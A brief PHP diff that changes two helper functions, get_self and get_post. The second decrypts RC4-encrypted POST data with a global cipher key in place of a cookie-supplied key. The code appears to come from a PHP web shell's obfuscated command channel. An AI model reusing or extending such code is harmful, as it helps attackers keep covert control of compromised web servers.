@@ -63,7 +63,7 @@ if(!function_exists('get_server_info')){
 if(!function_exists('get_self')){
 	function get_self(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
-		return html_safe($_SERVER["REQUEST_URI"].$query);
+		return html_safe($_SERVER["SCRIPT_NAME"].$query);
 	}
 }
 
@@ -77,7 +77,7 @@ if(!function_exists('get_post')){
 	function get_post(){
 		$post = fix_magic_quote($_POST);
 		if(empty($_FILES) && is_ajax()) {
-			$post_str = rc4($_COOKIE['pass'], hex2bin($post['target']));
+			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['target']));
 			parse_str($post_str, $post);
 		}	
 		return $post;
